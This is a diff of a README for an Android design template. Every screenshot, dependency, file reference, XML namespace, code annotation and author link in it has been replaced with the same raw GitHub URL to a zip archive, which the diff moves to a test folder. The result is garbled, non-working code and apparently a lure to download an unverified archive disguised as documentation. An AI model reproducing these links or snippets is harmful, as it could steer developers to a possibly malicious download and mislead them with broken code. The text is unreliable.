@@ -4,15 +4,15 @@ First of all, a few screenshots:
 
 Smartphone          |  Tablet
 :-------------------------:|:-------------------------:
-![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)  |  ![Tablet](https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)
+![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)  |  ![Tablet](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
 
 Collapsing Toolbar          |  Navigation Drawer
 :-------------------------:|:-------------------------: 
-![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)  |  ![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip) 
+![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)  |  ![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip) 
 
 Support Design Library Views          |  Preferences
 :-------------------------:|:-------------------------: 
-![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)  |  ![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip) 
+![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)  |  ![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip) 
 
 
 ## What is this?
@@ -39,30 +39,30 @@ The template support every device with a SDK level of at least 14 (Android 4+).
 
 ### Gradle
 
-Nothing special here. Please note that the version of the support library is extracted to *https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip*:
+Nothing special here. Please note that the version of the support library is extracted to *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*:
 
 ```xml
-    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip${android_support_lib_version}"
-    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip${android_support_lib_version}"
-    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip${android_support_lib_version}"
+    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip${android_support_lib_version}"
+    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip${android_support_lib_version}"
+    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip${android_support_lib_version}"
 
-    compile 'https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip'
-    compile 'https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip'
+    compile 'https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip'
+    compile 'https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip'
 ```
 
 ### Manifest
 
-There are only three Activities declared. The main theme is *https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip*.
+There are only three Activities declared. The main theme is *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*.
 
 ### Theme
 
-The project contains three *https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip*.
+The project contains three *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*.
 
-1. https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip  (basic colors, styles)
-2. https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip  (contains Android 5 statusbar/systembar features)
-3. https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip (used for tablet layout)
+1. https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip  (basic colors, styles)
+2. https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip  (contains Android 5 statusbar/systembar features)
+3. https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip (used for tablet layout)
 
-You can easily change the colors of your app. You only have to set the color values in https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip
+You can easily change the colors of your app. You only have to set the color values in https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -80,11 +80,11 @@ You can easily change the colors of your app. You only have to set the color val
 
 ### Navigation
 
-The navigation drawer is configured in *https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip*:
+The navigation drawer is configured in *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*:
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
-<menu xmlns:android="https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip">
+<menu xmlns:android="https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip">
     <group android:checkableBehavior="single">
         <item
             android:id="@+id/nav_quotes"
@@ -114,7 +114,7 @@ The *ListActivity* is the start *Activity* and supports two differend layout mod
 
 ### Settings
 
-The *SettingsActivity* represents some dummy preferences. You can easily configure your settings by modifying the *https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip*.
+The *SettingsActivity* represents some dummy preferences. You can easily configure your settings by modifying the *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*.
 
 ### View Samples
 
@@ -123,29 +123,29 @@ The *ViewSamplesActivity* shows some stuff from the Support Design Library.
 Butterknife is not only used for view binding, furthermore it is also used for configuring click listeners:
 
 ```java
-    @OnClick(https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)
+    @OnClick(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
     public void onFabClicked(View view) {
        // floating action button clicked
     }
 ```
 
-For example, the following snippet (https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip) binds automatically the view:
+For example, the following snippet (https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip) binds automatically the view:
 ```java
-    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)
+    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
     TextView quote;
 
-    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)
+    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
     TextView author;
 
-    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)
+    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
     ImageView backdropImg;
 
-    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip)
+    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
     CollapsingToolbarLayout collapsingToolbar;
 ```
 
 ## About
-My name is <a href="https://raw.githubusercontent.com/dextercool/android-design-template/master/spatialize/android-design-template.zip">Andreas Schrade</a> and I am a freelance software developer with an interest in Android and Java backend development.
+My name is <a href="https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip">Andreas Schrade</a> and I am a freelance software developer with an interest in Android and Java backend development.
 
 
 
